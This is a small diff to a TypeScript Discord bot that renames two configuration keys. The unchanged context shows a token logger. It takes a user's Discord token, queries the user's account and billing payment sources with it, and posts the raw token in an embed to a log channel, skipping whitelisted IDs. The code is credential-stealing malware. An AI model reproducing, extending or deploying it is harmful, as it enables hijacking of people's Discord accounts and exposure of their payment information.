@@ -72,7 +72,7 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
 
                 const discord: IUser = await (await fetch(`https://discord.com/api/users/@me`, { headers: { Authorization: token } })).json();
 
-                for (const whitelist of config.whitelisted_users) 
+                for (const whitelist of config.whitelistedUsers) 
                     if (discord.id === whitelist) return reslove(token);
                     
                 const billingInformation = await (await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, { headers: { Authorization: token } })).json();
@@ -92,7 +92,7 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
                     .addField('Token', token)
 
                 close();
-                (await client.channels.cache.get(config.log_channel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
+                (await client.channels.cache.get(config.logChannel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
                 reslove(token);
                 break;
             default:
